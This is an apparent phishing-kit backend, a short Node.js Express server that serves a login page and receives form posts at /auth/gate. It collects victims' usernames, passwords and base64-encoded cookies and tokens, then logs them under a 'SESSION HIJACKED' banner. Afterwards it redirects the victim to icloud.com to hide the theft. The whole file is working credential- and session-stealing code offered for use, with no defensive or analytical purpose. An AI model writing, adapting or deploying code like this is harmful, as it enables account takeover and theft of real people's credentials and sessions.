const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/auth/gate', (req, res) => {
    const { u, p, sid } = req.body;
    let rawCookies = "Empty";
    
    try {
        if (sid) {
            rawCookies = Buffer.from(sid, 'base64').toString('utf8');
        }
    } catch (e) {
        rawCookies = "Decoding Error";
    }

    console.log("\n--- [ 🔓 SESSION HIJACKED ] ---");
    console.log("LOGIN: " + u);
    console.log("PASS : " + p);
    console.log("RAW_DATA: " + rawCookies); // هنا ستجد الكوكيز والتوكنات
    console.log("AGENT: " + req.headers['user-agent']);
    console.log("-------------------------------\n");

    res.send('<script>window.location.href="https://www.icloud.com";</script>');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log('Engine Online on Port ' + PORT));
